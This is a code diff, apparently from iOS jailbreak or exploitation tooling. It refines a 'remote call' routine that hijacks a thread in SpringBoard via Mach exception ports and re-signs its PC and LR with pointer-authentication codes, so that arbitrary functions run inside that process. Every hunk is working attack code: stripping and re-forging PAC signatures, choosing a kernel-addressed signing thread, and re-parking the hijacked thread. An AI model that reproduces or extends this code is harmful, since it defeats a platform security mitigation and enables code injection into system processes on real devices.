@@ -867,7 +867,11 @@ uint64_t do_remote_call_stable(int timeout, const char *name,
         return res;
     }
 
-    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
+    // MUST strip PAC bits from local dlsym before remote_pac re-signs for the
+    // target thread. Leaving a locally-signed pointer here makes remote_pac
+    // produce a bad LR/PC; SpringBoard then RET to raw FAKE_LR 0x401 without
+    // our exception port catching it → SIGBUS 0x401 (seen in IPS).
+    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
     if (!pcAddr) {
         printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
         g_RC_success = false;
@@ -913,6 +917,8 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
         g_RC_success = false;
         return 0;
     }
+    // Addr-call sites may pass a still-signed pointer; strip before re-sign.
+    pcAddr = native_strip(pcAddr);
     int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
     int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
 
@@ -931,7 +937,11 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
     exc.threadState.__x[5] = x5;
     exc.threadState.__x[6] = x6;
     exc.threadState.__x[7] = x7;
-    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
+    // Signing thread for EXTRA path must be the synthetic call thread when live.
+    uint64_t signThread = is_kaddr_valid(g_RC_callThreadAddr)
+                            ? g_RC_callThreadAddr
+                            : g_RC_trojanThreadAddr;
+    sign_state(signThread, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
     reply_with_state(&exc, &exc.threadState);
 
     if (timeout < 0) {
@@ -941,11 +951,15 @@ uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const
 
     ExceptionMessage exc2;
     if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
-        printf("[%s:%d] Don't receive second exception on new thread\n", __FUNCTION__, __LINE__);
+        printf("[%s:%d] Don't receive second exception on new thread (name=%s) — repark\n",
+               __FUNCTION__, __LINE__, name ?: "(addr-call)");
+        // Best-effort: thread may be wedged at FAKE_LR. Mark failed; caller must
+        // abandon/reinit. Leaving success=false prevents further publishes.
         g_RC_success = false;
         return 0;
     }
     uint64_t retValue = exc2.threadState.__x[0];
+    // Re-park: reply keeps thread blocked in exception until next hijack.
     reply_with_state(&exc2, &exc2.threadState);
     if (remote_call_should_log_result(name, true))
         printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
